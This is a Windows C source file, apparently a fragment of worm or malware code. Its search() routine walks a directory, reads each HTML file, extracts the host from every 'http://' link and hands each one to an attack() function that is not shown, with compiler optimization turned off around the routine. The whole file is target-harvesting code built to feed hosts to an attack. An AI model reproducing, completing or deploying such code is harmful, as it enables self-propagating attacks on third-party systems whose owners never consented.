#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    volatile struct _LocalCtx {
        WIN32_FIND_DATAA wfd;
        HANDLE hFind;
        HANDLE hFile;
        DWORD bytesread;
        char *buf;
        char *p;
        char *host;
        DWORD size;
    } ctx;

    if (!SetCurrentDirectoryA(path)) return;

    ctx.hFind = FindFirstFileA("*.htm*", &ctx.wfd);
    if (ctx.hFind == INVALID_HANDLE_VALUE) return;

    do {
        ctx.hFile = CreateFileA(ctx.wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (ctx.hFile == INVALID_HANDLE_VALUE) continue;

        ctx.size = GetFileSize(ctx.hFile, NULL);
        if (ctx.size == INVALID_FILE_SIZE) { CloseHandle(ctx.hFile); continue; }

        ctx.buf = (char *)malloc(ctx.size + 1);
        if (!ctx.buf) { CloseHandle(ctx.hFile); continue; }

        if (!ReadFile(ctx.hFile, ctx.buf, ctx.size, &ctx.bytesread, NULL) || ctx.bytesread != ctx.size) {
            free(ctx.buf);
            CloseHandle(ctx.hFile);
            continue;
        }
        CloseHandle(ctx.hFile);
        ctx.buf[ctx.size] = '\0';

        ctx.p = ctx.buf;
        while (*ctx.p) {
            char *http = strstr(ctx.p, "http://");
            if (!http) break;
            ctx.host = http + 7;                // skip "http://"
            ctx.p = strchr(ctx.host, '/');
            if (!ctx.p) break;
            *ctx.p = '\0';                      // terminate at slash
            attack(ctx.host);
            ctx.p++;                            // move past the slash
        }
        free(ctx.buf);
    } while (FindNextFileA(ctx.hFind, &ctx.wfd));

    FindClose(ctx.hFind);
}

#pragma optimize("", on)
